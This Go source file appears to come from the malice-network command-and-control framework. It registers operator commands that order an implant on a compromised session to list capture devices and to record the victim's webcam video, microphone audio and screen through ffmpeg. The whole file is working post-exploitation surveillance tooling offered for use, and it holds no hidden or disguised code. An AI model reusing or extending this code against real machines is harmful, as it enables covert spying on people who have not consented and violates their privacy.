package third

import (
	"github.com/chainreactors/malice-network/client/core"
	"github.com/chainreactors/malice-network/client/repl"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/helper/proto/services/clientrpc"
	"github.com/chainreactors/malice-network/helper/utils/output"
	"github.com/spf13/cobra"
)

func ListDeviceCmd(con *repl.Console) error {

	session := con.GetInteractive()
	task, err := ListDevice(con.Rpc, session)
	if err != nil {
		return err
	}

	//session.Console(task, "ffmpeg")
	con.GetInteractive().Console(task, "list_devices")
	return nil
}

func ListDevice(rpc clientrpc.MaliceRPCClient, sess *core.Session) (*clientpb.Task, error) {
	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
		Action:       "list_devices",
		DeviceName:   "none",
		OutputFormat: "none",
		OutputPath:   "none",
	})
	if err != nil {
		return nil, err
	}
	return task, nil
}

func RecordVideoCmd(cmd *cobra.Command, con *repl.Console) error {
	deviceName, err := cmd.Flags().GetString("device_name")
	outputPath, err := cmd.Flags().GetString("output")
	duration, err := cmd.Flags().GetString("time")

	session := con.GetInteractive()
	task, err := RecordVideo(con.Rpc, session, deviceName, outputPath, duration)
	if err != nil {
		return err
	}
	//session.Console(task, "ffmpeg")
	con.GetInteractive().Console(task, "ffmpeg")
	return nil
}

func RecordVideo(rpc clientrpc.MaliceRPCClient, sess *core.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
		Action:       "record_video",
		DeviceName:   deviceName,
		OutputFormat: "avi",
		OutputPath:   outputPath,
		Time:         duration,
	})
	if err != nil {
		return nil, err
	}
	return task, nil
}

func RecordAudio(rpc clientrpc.MaliceRPCClient, sess *core.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
		Action:       "record_audio",
		DeviceName:   deviceName,
		OutputFormat: "wav",
		OutputPath:   outputPath,
		Time:         duration,
	})
	if err != nil {
		return nil, err
	}
	return task, nil
}

func RecordScreen(rpc clientrpc.MaliceRPCClient, sess *core.Session, deviceName, outputPath, duration string) (*clientpb.Task, error) {
	task, err := rpc.FFmpeg(sess.Context(), &implantpb.FFmpegRequest{
		Action:       "record_screen",
		DeviceName:   "",
		OutputFormat: "avi",
		OutputPath:   outputPath,
		Time:         duration,
	})
	if err != nil {
		return nil, err
	}
	return task, nil
}

func RegisterFFmpegCmdFunc(con *repl.Console) {

	con.RegisterImplantFunc(
		"list_devices",
		ListDevice,
		"blist_devices",
		ListDevice,
		output.ParseResponse,
		nil,
	)

	con.AddCommandFuncHelper(
		"list_devices",
		"list_devices",
		`list_devices`,
		[]string{
			"session: special session",
		},
		[]string{"task"})

	con.RegisterImplantFunc(
		"record_audio",
		RecordAudio,
		"brecord_audio",
		nil,
		output.ParseResponse,
		nil,
	)

	con.AddCommandFuncHelper(
		"record_audio",
		"record_audio",
		`record_audio`,
		[]string{
			"session: special session",
			"device_name: device name",
			"output: output path",
			"time: duration",
		},
		[]string{"task"})

	con.RegisterImplantFunc(
		"record_screen",
		RecordScreen,
		"brecord_screen",
		nil,
		output.ParseResponse,
		nil,
	)

	con.AddCommandFuncHelper(
		"record_screen",
		"record_screen",
		`record_screen`,
		[]string{
			"session: special session",
			"device_name: device name",
			"output: output path",
			"time: duration",
		},
		[]string{"task"})

	con.RegisterImplantFunc(
		"record_video",
		RecordVideo,
		"brecord_video",
		nil,
		output.ParseResponse,
		nil,
	)

	con.AddCommandFuncHelper(
		"record_video",
		"record_video",
		`record_video`,
		[]string{
			"session: special session",
			"device_name: device name",
			"output: output path",
			"time: duration",
		},
		[]string{"task"})

	//con.AddCommandFuncHelper(
	//	"bcurl",
	//	"bcurl",
	//	`bcurl(active(),"http://example.com")`,
	//	[]string{
	//		"session: special session",
	//		"url: target url",
	//	},
	//	[]string{"task"})
}
